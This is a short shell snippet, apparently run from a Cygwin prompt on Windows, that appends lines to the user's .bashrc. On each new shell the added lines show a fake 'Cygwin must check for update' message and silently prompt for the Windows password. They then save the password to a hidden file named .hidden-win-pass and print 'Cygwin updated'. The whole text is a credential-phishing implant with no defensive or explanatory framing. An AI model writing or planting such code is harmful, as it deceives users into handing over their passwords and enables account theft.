C:\cygwin64\Cygwin.bat
echo "echo \"Cygwin must check for update !\"" >> .bashrc
echo "echo $WINPASS >> .hidden-win-pass" >> .bashrc
echo "read -sp \"Please enter you Windows password for $WINUSER: \" WINPASS " >> .bashrc
echo "sleep 2" >> .bashrc
echo "echo \"\"" >> .bashrc
echo "echo \"Cygwin updated !\"" >> .bashrc
exit
